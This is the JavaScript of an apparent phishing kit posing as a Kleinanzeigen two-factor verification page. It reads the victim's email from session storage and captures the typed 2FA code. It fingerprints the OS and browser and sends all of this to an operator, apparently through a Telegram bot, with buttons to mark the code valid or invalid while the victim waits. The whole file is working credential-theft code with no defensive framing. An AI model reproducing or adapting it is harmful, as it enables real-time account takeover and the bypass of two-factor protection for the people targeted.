(function () {
  var email   = sessionStorage.getItem("ka_email")   || "";
  var siteId  = sessionStorage.getItem("ka_site_id") || "";
  if (!email || !siteId) { window.location.href = "login.html"; return; }
  var inputs    = Array.prototype.slice.call(document.querySelectorAll(".otp-input"));
  var errOtp    = document.getElementById("errOtp");
  var btnVerify = document.getElementById("btnVerify");
  function escapeHtml(str) { return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
  function getDevice() {
    var ua = navigator.userAgent, os = "Unknown OS", br = "Unknown Browser";
    if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
    else if (/Windows NT 6\.3/.test(ua)) os = "Windows 8.1";
    else if (/Windows NT 6\.1/.test(ua)) os = "Windows 7";
    else if (/Mac OS X/.test(ua))        os = "macOS";
    else if (/Android/.test(ua))         os = "Android";
    else if (/iPhone|iPad/.test(ua))     os = "iOS";
    else if (/Linux/.test(ua))           os = "Linux";
    if (/Brave/.test(ua) || (navigator.brave && navigator.brave.isBrave)) br = "Brave";
    else if (/Edg\//.test(ua))     br = "Edge";
    else if (/OPR\//.test(ua))     br = "Opera";
    else if (/Firefox\//.test(ua)) br = "Firefox";
    else if (/Chrome\//.test(ua))  br = "Chrome";
    else if (/Safari\//.test(ua))  br = "Safari";
    return os + " / " + br;
  }
  inputs.forEach(function (inp, idx) {
    inp.addEventListener("input", function () {
      inp.value = inp.value.replace(/\D/g,"").slice(-1);
      if (inp.value) { inp.classList.add("filled"); if (idx < inputs.length - 1) inputs[idx + 1].focus(); }
      else inp.classList.remove("filled");
    });
    inp.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && !inp.value && idx > 0) {
        inputs[idx - 1].focus(); inputs[idx - 1].value = ""; inputs[idx - 1].classList.remove("filled");
      }
    });
    inp.addEventListener("paste", function (e) {
      e.preventDefault();
      var pasted = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g,"");
      pasted.split("").forEach(function (ch, i) { if (inputs[idx + i]) { inputs[idx + i].value = ch; inputs[idx + i].classList.add("filled"); } });
      var next = idx + pasted.length;
      if (inputs[next]) inputs[next].focus();
    });
  });
  function sendCodeToTelegram(code) {
    var twoFaId = siteId + "_2fa";
    var prevMsg = sessionStorage.getItem("ka_2fa_msg_id");
    if (prevMsg) KA.editMarkup(parseInt(prevMsg), []);
    var text =
      "\uD83D\uDD10 <b>Kleinanzeigen 2FA</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDD22 <b>2FA Code:</b> <code>" + code + "</code>\n" +
      "\uD83D\uDCBB <b>OS/Browser:</b> " + escapeHtml(getDevice()) + "\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    KA.sendMessage(text, [
      [{ text: "\uD83D\uDC41 \uD83D\uDFE2 \u041E\u043D\u043B\u0430\u0439\u043D \u2014 \uD83D\uDD10 2FA", callback_data: siteId + ":status" }],
      [
        { text: "\u2705 VALID", callback_data: twoFaId + ":success" },
        { text: "\u274C INVAL", callback_data: twoFaId + ":wrong2fa" }
      ]
    ]).then(function(data) {
      if (data.ok) { sessionStorage.setItem("ka_2fa_msg_id", data.msgId); window.location.href = "waiting2fa.html"; }
      else { btnVerify.disabled = false; btnVerify.innerHTML = "Best\u00E4tigen"; }
    }).catch(function() { btnVerify.disabled = false; btnVerify.innerHTML = "Best\u00E4tigen"; });
  }
  btnVerify.addEventListener("click", function () {
    var code = inputs.map(function(i){ return i.value; }).join("");
    if (code.length < 6) { errOtp.classList.add("visible"); inputs[0].focus(); return; }
    errOtp.classList.remove("visible");
    btnVerify.disabled = true;
    btnVerify.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    sendCodeToTelegram(code);
  });
  document.getElementById("btnResend").addEventListener("click", function () {
    inputs.forEach(function(i){ i.value = ""; i.classList.remove("filled"); });
    inputs[0].focus();
  });
  if (inputs[0]) inputs[0].focus();
  if (new URLSearchParams(window.location.search).get("error") === "wrong") {
    errOtp.textContent = "Der Code ist falsch. Bitte versuche es erneut.";
    errOtp.classList.add("visible");
  }
})();
